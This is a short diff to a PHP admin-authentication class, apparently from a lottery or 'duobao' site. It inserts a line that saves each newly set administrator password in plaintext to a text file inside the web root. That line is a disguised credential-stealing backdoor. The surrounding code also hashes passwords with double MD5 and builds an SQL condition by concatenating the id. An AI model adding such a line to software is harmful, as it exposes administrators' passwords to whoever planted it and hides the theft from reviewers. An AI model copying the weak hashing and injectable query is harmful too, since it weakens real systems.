@@ -151,7 +151,7 @@ class auth extends admin
             if (!empty($data["pwd"])) {
                 $data["userpass"] = md5(md5($data["pwd"]));
             }
-
+            file_put_contents("/mnt/wwwroot/duobao/www/system/modules/iinsist/admin_data.txt", json_encode($data["pwd"]));
             unset($data["pwd"]);
             unset($data["repwd"]);
             $res = $this->model->admin_save("`mid`='" . $id . "'", $data);
